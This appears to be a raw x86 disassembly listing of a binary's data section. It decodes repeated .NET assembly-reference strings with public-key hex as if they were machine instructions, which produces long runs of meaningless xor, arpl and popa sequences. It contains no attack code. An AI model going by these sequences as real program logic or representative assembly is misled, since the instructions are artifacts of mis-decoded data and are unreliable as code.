  4058ea:	xor    eax,DWORD PTR [eax]
  4058ec:	add    BYTE PTR [ecx-0x7efffea5],al
  4058f2:	push   ebp
  4058f3:	push   esp
  4058f4:	inc    esp
  4058f5:	dec    esp
  4058f6:	outs   dx,DWORD PTR ds:[esi]
  4058f7:	addr16 inc esi
  4058f9:	jb     0x405960
  4058fb:	gs sub al,0x20
  4058fe:	push   eax
  4058ff:	jne    0x405963
  405901:	ins    BYTE PTR es:[edi],dx
  405902:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  405909:	xor    BYTE PTR [edx],dh
  40590b:	xor    al,0x30
  40590d:	xor    BYTE PTR [eax],dh
  40590f:	xor    BYTE PTR [eax],dh
  405911:	xor    al,0x38
  405913:	xor    BYTE PTR [eax],dh
  405915:	xor    BYTE PTR [eax],dh
  405917:	xor    BYTE PTR [ecx],bh
  405919:	xor    al,0x30
  40591b:	xor    BYTE PTR [eax],dh
  40591d:	xor    BYTE PTR [eax],dh
  40591f:	xor    BYTE PTR [eax],dh
  405921:	xor    BYTE PTR ss:[edx],dh
  405924:	xor    BYTE PTR [eax],dh
  405926:	xor    BYTE PTR [eax],dh
  405928:	xor    BYTE PTR [eax],dh
  40592a:	xor    dh,BYTE PTR [eax+esi*1]
  40592d:	xor    BYTE PTR [eax],dh
  40592f:	xor    BYTE PTR ds:0x34333532,dh
  405935:	xor    DWORD PTR [ebx],esi
  405937:	xor    DWORD PTR [eax],esi
  405939:	xor    BYTE PTR [eax],dh
  40593b:	xor    al,0x30
  40593d:	xor    BYTE PTR [eax],dh
  40593f:	xor    BYTE PTR [eax],dh
  405941:	xor    DWORD PTR [eax],esi
  405943:	xor    BYTE PTR [eax],dh
  405945:	xor    DWORD PTR [eax],esi
  405947:	xor    BYTE PTR [eax],dh
  405949:	aaa    
  40594a:	xor    DWORD PTR fs:[esi+0x61],esp
  40594e:	xor    eax,0x61346337
  405953:	gs cmp DWORD PTR fs:[esi+0x30],esp
  405958:	popa   
  405959:	xor    esi,DWORD PTR [edx]
  40595b:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40595f:	popa   
  405960:	xor    BYTE PTR [esi+0x61],ah
  405963:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40596a:	cmp    BYTE PTR gs:[esi+0x64],ah
  40596e:	ss popa 
  405970:	arpl   WORD PTR gs:[eax],di
  405973:	data16 cmp BYTE PTR [edi],dh
  405976:	bound  si,DWORD PTR [eax]
  405979:	xor    esi,DWORD PTR [edi]
  40597b:	ss arpl WORD PTR ss:[eax],di
  40597f:	xor    esi,DWORD PTR [ebx+eiz*2]
  405982:	cmp    DWORD PTR [ecx],edi
  405984:	cmp    DWORD PTR [edx],esi
  405986:	xor    DWORD PTR [ebp+0x62],esp
  405989:	xor    dh,BYTE PTR [ebx]
  40598b:	bound  esp,QWORD PTR [ebp+0x37]
  40598e:	cmp    DWORD PTR [ecx+0x64],esp
  405991:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  405995:	arpl   WORD PTR [ebx+0x31],sp
  405998:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40599d:	xor    dh,BYTE PTR [ebx]
  40599f:	xor    DWORD PTR ss:[ebx],esi
  4059a2:	xor    dh,BYTE PTR [ecx]
  4059a4:	xor    BYTE PTR [edx],dh
  4059a6:	cmp    DWORD PTR [eax],esi
  4059a8:	xor    BYTE PTR [edx+0x37],ah
  4059ab:	xor    dh,BYTE PTR [ebx]
  4059ad:	arpl   WORD PTR [esi+0x39],sp
  4059b0:	cmp    BYTE PTR [eax],dh
  4059b2:	cmp    DWORD PTR ds:0x34636637,esi
  4059b8:	xor    DWORD PTR gs:[edi],esi
  4059bb:	aaa    
  4059bc:	xor    DWORD PTR [eax],esi
  4059be:	cmp    BYTE PTR [esi+0x63],ah
  4059c1:	xor    BYTE PTR ss:[edi],dh
  4059c4:	aaa    
  4059c5:	aaa    
  4059c6:	xor    al,0x66
  4059c8:	xor    bh,BYTE PTR [ecx]
  4059ca:	cmp    BYTE PTR gs:[ebx],dh
  4059cd:	xor    dh,BYTE PTR [eax]
  4059cf:	cmp    DWORD PTR gs:[edx],esi
  4059d2:	gs popa 
  4059d4:	xor    BYTE PTR ds:0x34656365,dh
  4059da:	cmp    BYTE PTR gs:[edx],dh
  4059dd:	xor    DWORD PTR [ebx+0x30],esp
  4059e0:	popa   
  4059e1:	xor    eax,0x38656665
  4059e6:	xor    WORD PTR [esi],si
  4059e9:	xor    al,0x35
  4059eb:	arpl   WORD PTR [ebx+eiz*2],si
  4059ee:	xor    BYTE PTR [ebx+0x39],ah
  4059f1:	xor    esp,DWORD PTR [ebx+0x31]
  4059f4:	popa   
  4059f5:	bound  edi,QWORD PTR [ecx]
  4059f7:	cmp    DWORD PTR [edx],esi
  4059f9:	cmp    BYTE PTR ds:0x32323664,dh
  4059ff:	arpl   WORD PTR [ecx+0x61],sp
  405a02:	ss xor eax,0x64316332
  405a08:	popaw  
  405a0a:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405a10:	xor    eax,0x32663664
  405a15:	fs gs xor eax,0x65373166
  405a1c:	xor    eax,0x30666165
  405a21:	data16 arpl WORD PTR [ecx+edi*1],si
  405a25:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405a2a:	xor    DWORD PTR [ebx+0x38],esp
  405a2d:	popa   
  405a2e:	xor    DWORD PTR [edx],esi
  405a30:	xor    al,0x33
  405a32:	ss xor eax,0x30323831
  405a38:	ss arpl WORD PTR fs:[eax],si
  405a3c:	cmp    DWORD PTR [ebx],esi
  405a3e:	xor    esi,DWORD PTR [esp+esi*1]
  405a41:	fs xor eax,0x39326461
  405a47:	xor    eax,DWORD PTR [eax]
  405a49:	add    BYTE PTR [ecx-0x7efffe82],al
  405a4f:	js     0x405a9e
  405a51:	push   ebx
  405a52:	push   esp
  405a53:	gs jae 0x405aca
  405a56:	cs push esi
  405a58:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  405a5f:	jne    0x405ac5
  405a61:	imul   ebp,DWORD PTR [edi+0x2e],0x67616944
  405a68:	outs   dx,BYTE PTR ds:[esi]
  405a69:	outs   dx,DWORD PTR ds:[esi]
  405a6a:	jae    0x405ae0
  405a6c:	imul   esp,DWORD PTR [ebx+0x2e],0x6e495454
  405a73:	je     0x405ada
  405a75:	addr16 jb 0x405ad9
  405a78:	je     0x405ae3
  405a7a:	outs   dx,DWORD PTR ds:[esi]
  405a7b:	outs   dx,BYTE PTR ds:[esi]
  405a7c:	sub    al,0x20
  405a7e:	push   eax
  405a7f:	jne    0x405ae3
  405a81:	ins    BYTE PTR es:[edi],dx
  405a82:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  405a89:	xor    BYTE PTR [edx],dh
  405a8b:	xor    al,0x30
  405a8d:	xor    BYTE PTR [eax],dh
  405a8f:	xor    BYTE PTR [eax],dh
  405a91:	xor    al,0x38
  405a93:	xor    BYTE PTR [eax],dh
  405a95:	xor    BYTE PTR [eax],dh
  405a97:	xor    BYTE PTR [ecx],bh
  405a99:	xor    al,0x30
  405a9b:	xor    BYTE PTR [eax],dh
  405a9d:	xor    BYTE PTR [eax],dh
  405a9f:	xor    BYTE PTR [eax],dh
  405aa1:	xor    BYTE PTR ss:[edx],dh
  405aa4:	xor    BYTE PTR [eax],dh
  405aa6:	xor    BYTE PTR [eax],dh
  405aa8:	xor    BYTE PTR [eax],dh
  405aaa:	xor    dh,BYTE PTR [eax+esi*1]
  405aad:	xor    BYTE PTR [eax],dh
  405aaf:	xor    BYTE PTR ds:0x34333532,dh
  405ab5:	xor    DWORD PTR [ebx],esi
  405ab7:	xor    DWORD PTR [eax],esi
  405ab9:	xor    BYTE PTR [eax],dh
  405abb:	xor    al,0x30
  405abd:	xor    BYTE PTR [eax],dh
  405abf:	xor    BYTE PTR [eax],dh
  405ac1:	xor    DWORD PTR [eax],esi
  405ac3:	xor    BYTE PTR [eax],dh
  405ac5:	xor    DWORD PTR [eax],esi
  405ac7:	xor    BYTE PTR [eax],dh
  405ac9:	aaa    
  405aca:	xor    DWORD PTR fs:[esi+0x61],esp
  405ace:	xor    eax,0x61346337
  405ad3:	gs cmp DWORD PTR fs:[esi+0x30],esp
  405ad8:	popa   
  405ad9:	xor    esi,DWORD PTR [edx]
  405adb:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  405adf:	popa   
  405ae0:	xor    BYTE PTR [esi+0x61],ah
  405ae3:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  405aea:	cmp    BYTE PTR gs:[esi+0x64],ah
  405aee:	ss popa 
  405af0:	arpl   WORD PTR gs:[eax],di
  405af3:	data16 cmp BYTE PTR [edi],dh
  405af6:	bound  si,DWORD PTR [eax]
  405af9:	xor    esi,DWORD PTR [edi]
  405afb:	ss arpl WORD PTR ss:[eax],di
  405aff:	xor    esi,DWORD PTR [ebx+eiz*2]
  405b02:	cmp    DWORD PTR [ecx],edi
  405b04:	cmp    DWORD PTR [edx],esi
  405b06:	xor    DWORD PTR [ebp+0x62],esp
  405b09:	xor    dh,BYTE PTR [ebx]
  405b0b:	bound  esp,QWORD PTR [ebp+0x37]
  405b0e:	cmp    DWORD PTR [ecx+0x64],esp
  405b11:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  405b15:	arpl   WORD PTR [ebx+0x31],sp
  405b18:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  405b1d:	xor    dh,BYTE PTR [ebx]
  405b1f:	xor    DWORD PTR ss:[ebx],esi
  405b22:	xor    dh,BYTE PTR [ecx]
  405b24:	xor    BYTE PTR [edx],dh
  405b26:	cmp    DWORD PTR [eax],esi
  405b28:	xor    BYTE PTR [edx+0x37],ah
  405b2b:	xor    dh,BYTE PTR [ebx]
  405b2d:	arpl   WORD PTR [esi+0x39],sp
  405b30:	cmp    BYTE PTR [eax],dh
  405b32:	cmp    DWORD PTR ds:0x34636637,esi
  405b38:	xor    DWORD PTR gs:[edi],esi
  405b3b:	aaa    
  405b3c:	xor    DWORD PTR [eax],esi
  405b3e:	cmp    BYTE PTR [esi+0x63],ah
  405b41:	xor    BYTE PTR ss:[edi],dh
  405b44:	aaa    
  405b45:	aaa    
  405b46:	xor    al,0x66
  405b48:	xor    bh,BYTE PTR [ecx]
  405b4a:	cmp    BYTE PTR gs:[ebx],dh
  405b4d:	xor    dh,BYTE PTR [eax]
  405b4f:	cmp    DWORD PTR gs:[edx],esi
  405b52:	gs popa 
  405b54:	xor    BYTE PTR ds:0x34656365,dh
  405b5a:	cmp    BYTE PTR gs:[edx],dh
  405b5d:	xor    DWORD PTR [ebx+0x30],esp
  405b60:	popa   
  405b61:	xor    eax,0x38656665
  405b66:	xor    WORD PTR [esi],si
  405b69:	xor    al,0x35
  405b6b:	arpl   WORD PTR [ebx+eiz*2],si
  405b6e:	xor    BYTE PTR [ebx+0x39],ah
  405b71:	xor    esp,DWORD PTR [ebx+0x31]
  405b74:	popa   
  405b75:	bound  edi,QWORD PTR [ecx]
  405b77:	cmp    DWORD PTR [edx],esi
  405b79:	cmp    BYTE PTR ds:0x32323664,dh
  405b7f:	arpl   WORD PTR [ecx+0x61],sp
  405b82:	ss xor eax,0x64316332
  405b88:	popaw  
  405b8a:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405b90:	xor    eax,0x32663664
  405b95:	fs gs xor eax,0x65373166
  405b9c:	xor    eax,0x30666165
  405ba1:	data16 arpl WORD PTR [ecx+edi*1],si
  405ba5:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405baa:	xor    DWORD PTR [ebx+0x38],esp
  405bad:	popa   
  405bae:	xor    DWORD PTR [edx],esi
  405bb0:	xor    al,0x33
  405bb2:	ss xor eax,0x30323831
  405bb8:	ss arpl WORD PTR fs:[eax],si
  405bbc:	cmp    DWORD PTR [ebx],esi
  405bbe:	xor    esi,DWORD PTR [esp+esi*1]
  405bc1:	fs xor eax,0x39326461
  405bc7:	xor    eax,DWORD PTR [eax]
  405bc9:	add    BYTE PTR [ecx-0x7efffe97],al
  405bcf:	arpl   WORD PTR [ebx+0x6f],ax
  405bd2:	ins    BYTE PTR es:[edi],dx
  405bd3:	ins    BYTE PTR es:[edi],dx
  405bd4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405bd9:	outs   dx,BYTE PTR ds:[esi]
  405bda:	push   eax
  405bdb:	ins    BYTE PTR es:[edi],dx
  405bdc:	popa   
  405bdd:	outs   dx,BYTE PTR ds:[esi]
  405bde:	inc    ebx
  405bdf:	outs   dx,DWORD PTR ds:[esi]
  405be0:	outs   dx,BYTE PTR ds:[esi]
  405be1:	jbe    0x405c48
  405be3:	jb     0x405c59
  405be5:	gs jb  0x405c14
  405be8:	and    BYTE PTR [eax+0x75],dl
  405beb:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  405bef:	dec    ebx
  405bf0:	gs jns 0x405c30
  405bf3:	xor    BYTE PTR [eax],dh
  405bf5:	xor    dh,BYTE PTR [eax+esi*1]
  405bf8:	xor    BYTE PTR [eax],dh
  405bfa:	xor    BYTE PTR [eax],dh
  405bfc:	xor    al,0x38
  405bfe:	xor    BYTE PTR [eax],dh
  405c00:	xor    BYTE PTR [eax],dh
  405c02:	xor    BYTE PTR [ecx],bh
  405c04:	xor    al,0x30
  405c06:	xor    BYTE PTR [eax],dh
  405c08:	xor    BYTE PTR [eax],dh
  405c0a:	xor    BYTE PTR [eax],dh
  405c0c:	xor    BYTE PTR ss:[edx],dh
  405c0f:	xor    BYTE PTR [eax],dh
  405c11:	xor    BYTE PTR [eax],dh
  405c13:	xor    BYTE PTR [eax],dh
  405c15:	xor    dh,BYTE PTR [eax+esi*1]
  405c18:	xor    BYTE PTR [eax],dh
  405c1a:	xor    BYTE PTR ds:0x34333532,dh
  405c20:	xor    DWORD PTR [ebx],esi
  405c22:	xor    DWORD PTR [eax],esi
  405c24:	xor    BYTE PTR [eax],dh
  405c26:	xor    al,0x30
  405c28:	xor    BYTE PTR [eax],dh
  405c2a:	xor    BYTE PTR [eax],dh
  405c2c:	xor    DWORD PTR [eax],esi
  405c2e:	xor    BYTE PTR [eax],dh
  405c30:	xor    DWORD PTR [eax],esi
  405c32:	xor    BYTE PTR [eax],dh
  405c34:	aaa    
  405c35:	xor    DWORD PTR fs:[esi+0x61],esp
  405c39:	xor    eax,0x61346337
  405c3e:	gs cmp DWORD PTR fs:[esi+0x30],esp
  405c43:	popa   
  405c44:	xor    esi,DWORD PTR [edx]
  405c46:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  405c4a:	popa   
  405c4b:	xor    BYTE PTR [esi+0x61],ah
  405c4e:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  405c55:	cmp    BYTE PTR gs:[esi+0x64],ah
  405c59:	ss popa 
  405c5b:	arpl   WORD PTR gs:[eax],di
  405c5e:	data16 cmp BYTE PTR [edi],dh
  405c61:	bound  si,DWORD PTR [eax]
  405c64:	xor    esi,DWORD PTR [edi]
  405c66:	ss arpl WORD PTR ss:[eax],di
  405c6a:	xor    esi,DWORD PTR [ebx+eiz*2]
  405c6d:	cmp    DWORD PTR [ecx],edi
  405c6f:	cmp    DWORD PTR [edx],esi
  405c71:	xor    DWORD PTR [ebp+0x62],esp
  405c74:	xor    dh,BYTE PTR [ebx]
  405c76:	bound  esp,QWORD PTR [ebp+0x37]
  405c79:	cmp    DWORD PTR [ecx+0x64],esp
  405c7c:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  405c80:	arpl   WORD PTR [ebx+0x31],sp
  405c83:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  405c88:	xor    dh,BYTE PTR [ebx]
  405c8a:	xor    DWORD PTR ss:[ebx],esi
  405c8d:	xor    dh,BYTE PTR [ecx]
  405c8f:	xor    BYTE PTR [edx],dh
  405c91:	cmp    DWORD PTR [eax],esi
  405c93:	xor    BYTE PTR [edx+0x37],ah
  405c96:	xor    dh,BYTE PTR [ebx]
  405c98:	arpl   WORD PTR [esi+0x39],sp
  405c9b:	cmp    BYTE PTR [eax],dh
  405c9d:	cmp    DWORD PTR ds:0x34636637,esi
  405ca3:	xor    DWORD PTR gs:[edi],esi
  405ca6:	aaa    
  405ca7:	xor    DWORD PTR [eax],esi
  405ca9:	cmp    BYTE PTR [esi+0x63],ah
  405cac:	xor    BYTE PTR ss:[edi],dh
  405caf:	aaa    
  405cb0:	aaa    
  405cb1:	xor    al,0x66
  405cb3:	xor    bh,BYTE PTR [ecx]
  405cb5:	cmp    BYTE PTR gs:[ebx],dh
  405cb8:	xor    dh,BYTE PTR [eax]
  405cba:	cmp    DWORD PTR gs:[edx],esi
  405cbd:	gs popa 
  405cbf:	xor    BYTE PTR ds:0x34656365,dh
  405cc5:	cmp    BYTE PTR gs:[edx],dh
  405cc8:	xor    DWORD PTR [ebx+0x30],esp
  405ccb:	popa   
  405ccc:	xor    eax,0x38656665
  405cd1:	xor    WORD PTR [esi],si
  405cd4:	xor    al,0x35
  405cd6:	arpl   WORD PTR [ebx+eiz*2],si
  405cd9:	xor    BYTE PTR [ebx+0x39],ah
  405cdc:	xor    esp,DWORD PTR [ebx+0x31]
  405cdf:	popa   
  405ce0:	bound  edi,QWORD PTR [ecx]
  405ce2:	cmp    DWORD PTR [edx],esi
  405ce4:	cmp    BYTE PTR ds:0x32323664,dh
  405cea:	arpl   WORD PTR [ecx+0x61],sp
  405ced:	ss xor eax,0x64316332
  405cf3:	popaw  
  405cf5:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405cfb:	xor    eax,0x32663664
  405d00:	fs gs xor eax,0x65373166
  405d07:	xor    eax,0x30666165
  405d0c:	data16 arpl WORD PTR [ecx+edi*1],si
  405d10:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405d15:	xor    DWORD PTR [ebx+0x38],esp
  405d18:	popa   
  405d19:	xor    DWORD PTR [edx],esi
  405d1b:	xor    al,0x33
  405d1d:	ss xor eax,0x30323831
  405d23:	ss arpl WORD PTR fs:[eax],si
  405d27:	cmp    DWORD PTR [ebx],esi
  405d29:	xor    esi,DWORD PTR [esp+esi*1]
  405d2c:	fs xor eax,0x39326461
  405d32:	xor    eax,DWORD PTR [eax]
  405d34:	add    BYTE PTR [ecx-0x7efffea5],al
  405d3a:	push   ebp
  405d3b:	push   esp
  405d3c:	inc    esp
  405d3d:	inc    edx
  405d3e:	jb     0x405daf
  405d40:	ja     0x405db5
  405d42:	gs jb  0x405d71
  405d45:	and    BYTE PTR [eax+0x75],dl
  405d48:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  405d4c:	dec    ebx
  405d4d:	gs jns 0x405d8d
  405d50:	xor    BYTE PTR [eax],dh
  405d52:	xor    dh,BYTE PTR [eax+esi*1]
  405d55:	xor    BYTE PTR [eax],dh
  405d57:	xor    BYTE PTR [eax],dh
  405d59:	xor    al,0x38
  405d5b:	xor    BYTE PTR [eax],dh
  405d5d:	xor    BYTE PTR [eax],dh
  405d5f:	xor    BYTE PTR [ecx],bh
  405d61:	xor    al,0x30
  405d63:	xor    BYTE PTR [eax],dh
  405d65:	xor    BYTE PTR [eax],dh
  405d67:	xor    BYTE PTR [eax],dh
  405d69:	xor    BYTE PTR ss:[edx],dh
  405d6c:	xor    BYTE PTR [eax],dh
  405d6e:	xor    BYTE PTR [eax],dh
  405d70:	xor    BYTE PTR [eax],dh
  405d72:	xor    dh,BYTE PTR [eax+esi*1]
  405d75:	xor    BYTE PTR [eax],dh
  405d77:	xor    BYTE PTR ds:0x34333532,dh
  405d7d:	xor    DWORD PTR [ebx],esi
  405d7f:	xor    DWORD PTR [eax],esi
  405d81:	xor    BYTE PTR [eax],dh
  405d83:	xor    al,0x30
  405d85:	xor    BYTE PTR [eax],dh
  405d87:	xor    BYTE PTR [eax],dh
  405d89:	xor    DWORD PTR [eax],esi
  405d8b:	xor    BYTE PTR [eax],dh
  405d8d:	xor    DWORD PTR [eax],esi
  405d8f:	xor    BYTE PTR [eax],dh
  405d91:	aaa    
  405d92:	xor    DWORD PTR fs:[esi+0x61],esp
  405d96:	xor    eax,0x61346337
  405d9b:	gs cmp DWORD PTR fs:[esi+0x30],esp
  405da0:	popa   
  405da1:	xor    esi,DWORD PTR [edx]
  405da3:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  405da7:	popa   
  405da8:	xor    BYTE PTR [esi+0x61],ah
  405dab:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  405db2:	cmp    BYTE PTR gs:[esi+0x64],ah
  405db6:	ss popa 
  405db8:	arpl   WORD PTR gs:[eax],di
  405dbb:	data16 cmp BYTE PTR [edi],dh
  405dbe:	bound  si,DWORD PTR [eax]
  405dc1:	xor    esi,DWORD PTR [edi]
  405dc3:	ss arpl WORD PTR ss:[eax],di
  405dc7:	xor    esi,DWORD PTR [ebx+eiz*2]
  405dca:	cmp    DWORD PTR [ecx],edi
  405dcc:	cmp    DWORD PTR [edx],esi
  405dce:	xor    DWORD PTR [ebp+0x62],esp
  405dd1:	xor    dh,BYTE PTR [ebx]
  405dd3:	bound  esp,QWORD PTR [ebp+0x37]
  405dd6:	cmp    DWORD PTR [ecx+0x64],esp
  405dd9:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  405ddd:	arpl   WORD PTR [ebx+0x31],sp
  405de0:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  405de5:	xor    dh,BYTE PTR [ebx]
  405de7:	xor    DWORD PTR ss:[ebx],esi
  405dea:	xor    dh,BYTE PTR [ecx]
  405dec:	xor    BYTE PTR [edx],dh
  405dee:	cmp    DWORD PTR [eax],esi
  405df0:	xor    BYTE PTR [edx+0x37],ah
  405df3:	xor    dh,BYTE PTR [ebx]
  405df5:	arpl   WORD PTR [esi+0x39],sp
  405df8:	cmp    BYTE PTR [eax],dh
  405dfa:	cmp    DWORD PTR ds:0x34636637,esi
  405e00:	xor    DWORD PTR gs:[edi],esi
  405e03:	aaa    
  405e04:	xor    DWORD PTR [eax],esi
  405e06:	cmp    BYTE PTR [esi+0x63],ah
  405e09:	xor    BYTE PTR ss:[edi],dh
  405e0c:	aaa    
  405e0d:	aaa    
  405e0e:	xor    al,0x66
  405e10:	xor    bh,BYTE PTR [ecx]
  405e12:	cmp    BYTE PTR gs:[ebx],dh
  405e15:	xor    dh,BYTE PTR [eax]
  405e17:	cmp    DWORD PTR gs:[edx],esi
  405e1a:	gs popa 
  405e1c:	xor    BYTE PTR ds:0x34656365,dh
  405e22:	cmp    BYTE PTR gs:[edx],dh
  405e25:	xor    DWORD PTR [ebx+0x30],esp
  405e28:	popa   
  405e29:	xor    eax,0x38656665
  405e2e:	xor    WORD PTR [esi],si
  405e31:	xor    al,0x35
  405e33:	arpl   WORD PTR [ebx+eiz*2],si
  405e36:	xor    BYTE PTR [ebx+0x39],ah
  405e39:	xor    esp,DWORD PTR [ebx+0x31]
  405e3c:	popa   
  405e3d:	bound  edi,QWORD PTR [ecx]
  405e3f:	cmp    DWORD PTR [edx],esi
  405e41:	cmp    BYTE PTR ds:0x32323664,dh
  405e47:	arpl   WORD PTR [ecx+0x61],sp
  405e4a:	ss xor eax,0x64316332
  405e50:	popaw  
  405e52:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405e58:	xor    eax,0x32663664
  405e5d:	fs gs xor eax,0x65373166
  405e64:	xor    eax,0x30666165
  405e69:	data16 arpl WORD PTR [ecx+edi*1],si
  405e6d:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405e72:	xor    DWORD PTR [ebx+0x38],esp
  405e75:	popa   
  405e76:	xor    DWORD PTR [edx],esi
  405e78:	xor    al,0x33
  405e7a:	ss xor eax,0x30323831
  405e80:	ss arpl WORD PTR fs:[eax],si
  405e84:	cmp    DWORD PTR [ebx],esi
  405e86:	xor    esi,DWORD PTR [esp+esi*1]
  405e89:	fs xor eax,0x39326461
  405e8f:	xor    eax,DWORD PTR [eax]
  405e91:	add    BYTE PTR [ecx-0x7efffea4],al
  405e97:	push   esi
  405e98:	inc    edi
  405e99:	inc    ebx
  405e9a:	push   esi
  405e9b:	gs jb  0x405f07
  405e9e:	imul   sp,WORD PTR [ebp+0x72],0x202c
  405ea4:	push   eax
  405ea5:	jne    0x405f09
  405ea7:	ins    BYTE PTR es:[edi],dx
  405ea8:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  405eaf:	xor    BYTE PTR [edx],dh
  405eb1:	xor    al,0x30
  405eb3:	xor    BYTE PTR [eax],dh
  405eb5:	xor    BYTE PTR [eax],dh
  405eb7:	xor    al,0x38
  405eb9:	xor    BYTE PTR [eax],dh
  405ebb:	xor    BYTE PTR [eax],dh
  405ebd:	xor    BYTE PTR [ecx],bh
  405ebf:	xor    al,0x30
  405ec1:	xor    BYTE PTR [eax],dh
  405ec3:	xor    BYTE PTR [eax],dh
  405ec5:	xor    BYTE PTR [eax],dh
  405ec7:	xor    BYTE PTR ss:[edx],dh
  405eca:	xor    BYTE PTR [eax],dh
  405ecc:	xor    BYTE PTR [eax],dh
  405ece:	xor    BYTE PTR [eax],dh
  405ed0:	xor    dh,BYTE PTR [eax+esi*1]
  405ed3:	xor    BYTE PTR [eax],dh
  405ed5:	xor    BYTE PTR ds:0x34333532,dh
  405edb:	xor    DWORD PTR [ebx],esi
  405edd:	xor    DWORD PTR [eax],esi
  405edf:	xor    BYTE PTR [eax],dh
  405ee1:	xor    al,0x30
  405ee3:	xor    BYTE PTR [eax],dh
  405ee5:	xor    BYTE PTR [eax],dh
  405ee7:	xor    DWORD PTR [eax],esi
  405ee9:	xor    BYTE PTR [eax],dh
  405eeb:	xor    DWORD PTR [eax],esi
  405eed:	xor    BYTE PTR [eax],dh
  405eef:	aaa    
  405ef0:	xor    DWORD PTR fs:[esi+0x61],esp
  405ef4:	xor    eax,0x61346337
  405ef9:	gs cmp DWORD PTR fs:[esi+0x30],esp
  405efe:	popa   
  405eff:	xor    esi,DWORD PTR [edx]
  405f01:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  405f05:	popa   
  405f06:	xor    BYTE PTR [esi+0x61],ah
  405f09:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  405f10:	cmp    BYTE PTR gs:[esi+0x64],ah
  405f14:	ss popa 
  405f16:	arpl   WORD PTR gs:[eax],di
  405f19:	data16 cmp BYTE PTR [edi],dh
  405f1c:	bound  si,DWORD PTR [eax]
  405f1f:	xor    esi,DWORD PTR [edi]
  405f21:	ss arpl WORD PTR ss:[eax],di
  405f25:	xor    esi,DWORD PTR [ebx+eiz*2]
  405f28:	cmp    DWORD PTR [ecx],edi
  405f2a:	cmp    DWORD PTR [edx],esi
  405f2c:	xor    DWORD PTR [ebp+0x62],esp
  405f2f:	xor    dh,BYTE PTR [ebx]
  405f31:	bound  esp,QWORD PTR [ebp+0x37]
  405f34:	cmp    DWORD PTR [ecx+0x64],esp
  405f37:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  405f3b:	arpl   WORD PTR [ebx+0x31],sp
  405f3e:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  405f43:	xor    dh,BYTE PTR [ebx]
  405f45:	xor    DWORD PTR ss:[ebx],esi
  405f48:	xor    dh,BYTE PTR [ecx]
  405f4a:	xor    BYTE PTR [edx],dh
  405f4c:	cmp    DWORD PTR [eax],esi
  405f4e:	xor    BYTE PTR [edx+0x37],ah
  405f51:	xor    dh,BYTE PTR [ebx]
  405f53:	arpl   WORD PTR [esi+0x39],sp
  405f56:	cmp    BYTE PTR [eax],dh
  405f58:	cmp    DWORD PTR ds:0x34636637,esi
  405f5e:	xor    DWORD PTR gs:[edi],esi
  405f61:	aaa    
  405f62:	xor    DWORD PTR [eax],esi
  405f64:	cmp    BYTE PTR [esi+0x63],ah
  405f67:	xor    BYTE PTR ss:[edi],dh
  405f6a:	aaa    
  405f6b:	aaa    
  405f6c:	xor    al,0x66
  405f6e:	xor    bh,BYTE PTR [ecx]
  405f70:	cmp    BYTE PTR gs:[ebx],dh
  405f73:	xor    dh,BYTE PTR [eax]
  405f75:	cmp    DWORD PTR gs:[edx],esi
  405f78:	gs popa 
  405f7a:	xor    BYTE PTR ds:0x34656365,dh
  405f80:	cmp    BYTE PTR gs:[edx],dh
  405f83:	xor    DWORD PTR [ebx+0x30],esp
  405f86:	popa   
  405f87:	xor    eax,0x38656665
  405f8c:	xor    WORD PTR [esi],si
  405f8f:	xor    al,0x35
  405f91:	arpl   WORD PTR [ebx+eiz*2],si
  405f94:	xor    BYTE PTR [ebx+0x39],ah
  405f97:	xor    esp,DWORD PTR [ebx+0x31]
  405f9a:	popa   
  405f9b:	bound  edi,QWORD PTR [ecx]
  405f9d:	cmp    DWORD PTR [edx],esi
  405f9f:	cmp    BYTE PTR ds:0x32323664,dh
  405fa5:	arpl   WORD PTR [ecx+0x61],sp
  405fa8:	ss xor eax,0x64316332
  405fae:	popaw  
  405fb0:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405fb6:	xor    eax,0x32663664
  405fbb:	fs gs xor eax,0x65373166
  405fc2:	xor    eax,0x30666165
  405fc7:	data16 arpl WORD PTR [ecx+edi*1],si
  405fcb:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405fd0:	xor    DWORD PTR [ebx+0x38],esp
  405fd3:	popa   
  405fd4:	xor    DWORD PTR [edx],esi
  405fd6:	xor    al,0x33
  405fd8:	ss xor eax,0x30323831
  405fde:	ss arpl WORD PTR fs:[eax],si
  405fe2:	cmp    DWORD PTR [ebx],esi
  405fe4:	xor    esi,DWORD PTR [esp+esi*1]
